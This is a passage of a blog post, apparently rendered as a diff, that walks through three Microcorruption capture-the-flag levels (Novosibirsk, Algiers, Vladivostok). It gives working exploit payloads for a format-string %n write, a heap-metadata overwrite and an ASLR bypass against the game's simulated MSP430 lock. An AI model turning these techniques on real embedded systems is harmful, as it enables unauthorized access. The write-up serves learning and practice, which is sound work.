+<h2 id="novosibirsk">Novosibirsk</h2>
+
+<p>There is clearly another printf vulernability here. And now we can copy up to 512 characters from the input
+Also, this time we are calling an interrupt that checks password validity internally</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>; conditional_unlock_door
+...
+44c2:  0e12           push	r14
+44c4:  0f12           push	r15
+44c6:  3012 7e00      push	#0x7e
+44ca:  b012 3645      call	#0x4536 &lt;INT&gt;
+</code></pre></div></div>
+
+<p>However, since we can use a lot of chars, why not to try to override the interrupt number that we are executing?</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>44c6:  3012 7e00      push	#0x7e
+</code></pre></div></div>
+
+<p>Let’s change this to <code class="language-plaintext highlighter-rouge">0x7f</code> to unconditionally open the door. It will amount to 127 in dec, so we can use <code class="language-plaintext highlighter-rouge">%n</code> vulernability again to modify the opcode of the <code class="language-plaintext highlighter-rouge">push</code> instruction and change the interrupt code
+We can use this code to generate the payload:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python -c 'print("c844" + "42"*125 + "".join(format(ord(c), "02x") for c in "%n%n"))' | pbcopy
+</code></pre></div></div>
+
+<p>Breakdown</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">c844</code> is the address of where the interrupt code is located in memory in little endian format</li>
+  <li><code class="language-plaintext highlighter-rouge">"42"*125</code> is 125 symbols in a row, can be any symbol</li>
+  <li>Then, we use <code class="language-plaintext highlighter-rouge">%n%n</code> to write the number <code class="language-plaintext highlighter-rouge">2 + 125 = 127</code> to the memory location that we indicate at the start of the string, which is <code class="language-plaintext highlighter-rouge">448c</code></li>
+</ul>
+
+<h2 id="algiers">Algiers</h2>
+<p>This challenge is a bit different. It’s related to heap corruption attachs, which are a new type for us.</p>
+
+<p>Here are some good related materials:</p>
+<ul>
+  <li>Understanding heap layout: https://azeria-labs.com/heap-exploitation-part-2-glibc-heap-free-bins/</li>
+  <li>A good writeup on it, could not solve it myself: https://medium.com/@sigkilla9/algiers-heap-exploitation-microcorruption-com-61008079bd0d</li>
+  <li>We have two malloc calls here, probably for username and password. malloc is also susceptible to overflow attacks: https://neerajsnawale.medium.com/exploit-more-memory-than-allocated-with-malloc-why-c30cb1ba36b5</li>
+</ul>
+
+<p>The approach to tackle Algiers is that you should take advantage of overflowing the malloc buffer structure. You can enter long password and overwrite chunk’s metadata. If you will reverse what <code class="language-plaintext highlighter-rouge">free</code> does carefully, you will notice that the key is on this line:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>452a:  8e4c 0400      mov	r12, 0x4(r14)
+</code></pre></div></div>
+
+<p>We are moving some data we have control of to some memory address that we have control of. Meaning, that if we put a  correct number in <code class="language-plaintext highlighter-rouge">r14</code>, we can write to the top of the stack. In other words, we can overwrite the return address of the <code class="language-plaintext highlighter-rouge">free</code> function. By carefully examining which mathematical operations happen to registers inside <code class="language-plaintext highlighter-rouge">free</code> function we can calculate what value to put in there so that at the end of the function we will write address of an <code class="language-plaintext highlighter-rouge">unlock</code> call. The resulting payload is</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>4242424242424242424242424242424290434024dcff414141
+</code></pre></div></div>
+
+<h2 id="vladivostok">Vladivostok</h2>
+<p>This challenge presents an ASLR. ASLR is a security feature that randomizes the memory address where system executables are loaded into memory. This makes it harder for attackers to predict the location of code in memory. This makes debugging and understanding what is happening in the code a lot harder. However, we can still notice that <code class="language-plaintext highlighter-rouge">sp</code> can be overflowed by providing long inputs. The question now is where should we return to?</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>414141414141414141414242
+; where 4242 will be our SP address
+</code></pre></div></div>
+
+<p>So, we can find out to which address we should return to. This is complicated, since ASLR randomizes code segment address. However, if you read through the <code class="language-plaintext highlighter-rouge">main</code> the function itself, it will be clear that the code bytes are just copied over to some other random location in memory. That means, that all relative addresses should stay the same. We should just calculate an offset for something that calls an interrupt. And then we can use the door unlock interrupt address that we will put on stack.</p>
+
+<p>If we will use <code class="language-plaintext highlighter-rouge">%x%x%x%x</code> as a username, we will see top of the stack printed. Since it’s a print, we can judge that this is the addreess of a <code class="language-plaintext highlighter-rouge">printf</code> call.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>476a &lt;printf&gt; ; in the original code
+; base address of the original code is 0x4400
+; we can try returning to
+48ec &lt;_INT&gt;
+
+0x48ec -  0x476a = 0x19a
+</code></pre></div></div>
+
+<p>Now, at the start of the program we can print or <code class="language-plaintext highlighter-rouge">printf</code> address, calculate <code class="language-plaintext highlighter-rouge">INT</code> address using the offset. Our winning payload is</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>4141414141414141 [%x%x output + 0x19a] 4141 7f00
+</code></pre></div></div>
+
+<h1 id="conclusion">Conclusion</h1>
+
+<p>Microcorruption is a very challenging and fun way to learn about embedded systems security. It’s a great way to learn about assembly, stack overflows, memory corruption bugs and even some advanced concepts like ASLR.</p>
+
+<p>While many types of these bugs are not very relevant in software world due to modern security features, they are still relevant and quite easy to make in the embedded world, where can find yourself writing code for bare metal without any OS support.</p>
+
+
+<div class="share-page">
+    <div class="wow bounce">
+    <p>
+    <b class="contrast">Share this post</b><br/>
+    </p>
+    </div>
+    <a href="https://twitter.com/intent/tweet?text=Solving Microcorruption&url=/articles/microcorruption&via=kdubovikov&related=kdubovikov" rel="nofollow" target="_blank" title="Share on Twitter"><span class="icon-twitter"></span></a>
+    <a href="https://facebook.com/sharer.php?u=/articles/microcorruption" rel="nofollow" target="_blank" title="Share on Facebook"><span class="icon-facebook2"></span></a>
+    <a href="http://www.linkedin.com/shareArticle?mini=true&url=<URL>&title=Solving Microcorruption&summary=Solving Microcorruption&source=/articles/microcorruption" rel="nofollow" target="_blank" title="Share on LinkedIn+"><span class="icon-linkedin"></span></a>
+    <a href="http://www.reddit.com/submit?url=/articles/microcorruption&title=Solving Microcorruption" rel="nofollow" target="_blank" title="Share on Reddit"><span class="icon-reddit"></span></a>
+</div>
+    </article>
+    <span class="print-footer">Solving Microcorruption - February 20, 2024 - Kirill Dubovikov</span>
+    <footer>
+  <hr class="slender">
+  <ul class="footer-links">
+    
+      <li>
+        <a class="social-link" href="//www.twitter.com/kdubovikov">Twitter</a>
+      </li>
+    
+      <li>
+        <a class="social-link" href="//github.com/kdubovikov">GitHub</a>
+      </li>
+    
+      <li>
+        <a class="social-link" href="//linkedin.com/in/kirill-dubovikov-2a20b154/">LinkedIn</a>
+      </li>
+      
+    <li>
+      <a class="social-link" href="/feed.xml">RSS</a>
+    </li>
+  </ul>
+<div class="credits">
+<span>&copy; 2024 &nbsp;&nbsp;KIRILL DUBOVIKOV</span></br> <br>
+</div>  
+</footer>
+  </body>
+</html>
